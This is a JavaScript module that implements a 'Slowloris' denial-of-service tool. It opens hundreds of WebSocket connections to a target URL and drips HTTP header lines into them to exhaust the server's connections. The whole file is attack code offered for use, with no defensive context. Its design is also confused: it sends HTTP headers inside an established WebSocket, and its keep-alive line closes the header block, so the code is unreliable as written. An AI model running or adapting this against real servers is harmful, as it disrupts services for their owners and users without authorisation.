import { WebSocket } from 'ws';

function slowloris(target, numSockets) {
  if (!target) {
    console.error("Target URL is required.");
    return;
  }

  try {
    const parsedTarget = new URL(target);
    const hostname = parsedTarget.hostname;
    const port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
    const isSecure = parsedTarget.protocol === 'https:';
    const path = parsedTarget.pathname || "/";

    if (!numSockets || numSockets <= 0) {
      numSockets = 200;
    }

    console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);

    for (let i = 0; i < numSockets; i++) {
      createSocket(hostname, port, i, isSecure, path);
    }

    function createSocket(hostname, port, index, isSecure, path) {
      let socket;
      try {
        const protocol = isSecure ? 'wss://' : 'ws://';
        socket = new WebSocket(`${protocol}${hostname}:${port}${path}`, {
          origin: `${protocol}${hostname}`
        });

        socket.on('open', () => {
          console.log(`Socket ${index + 1} opened.`);
          sendInitialHeader(socket, hostname);
          setInterval(() => {
            sendKeepAliveHeader(socket);
          }, 15000);
        });

        socket.on('close', () => {
          console.log(`Socket ${index + 1} closed.`);
        });

        socket.on('error', (error) => {
          console.error(`Socket ${index + 1} error: ${error.message}`);
          try {
            if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING) {
              socket.close();
            }
          } catch (closeError) {
            console.error(`Error closing socket ${index + 1}:`, closeError.message);
          }
        });
      } catch (socketError) {
        console.error(`Error creating socket ${index + 1}:`, socketError.message);
      }
    }

    function sendInitialHeader(socket, hostname) {
      const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n`;
      try {
        socket.send(initialHeader);
      } catch (error) {
        console.error("Error sending initial header:", error.message);
        try {
          if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING) {
            socket.close();
          }
        } catch (closeError) {
          console.error("Error closing socket after send error:", closeError.message);
        }
      }
    }

    function sendKeepAliveHeader(socket) {
      const keepAliveHeader = "X-Custom-Header: keep-alive\r\n\r\n";
      try {
        socket.send(keepAliveHeader);
      } catch (error) {
        console.error("Error sending keep-alive header:", error.message);
        try {
          if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING) {
            socket.close();
          }
        } catch (closeError) {
          console.error("Error closing socket after send error:", closeError.message);
        }
      }
    }
  } catch (error) {
    console.error("Error during Slowloris setup:", error.message);
  }
}

export { slowloris };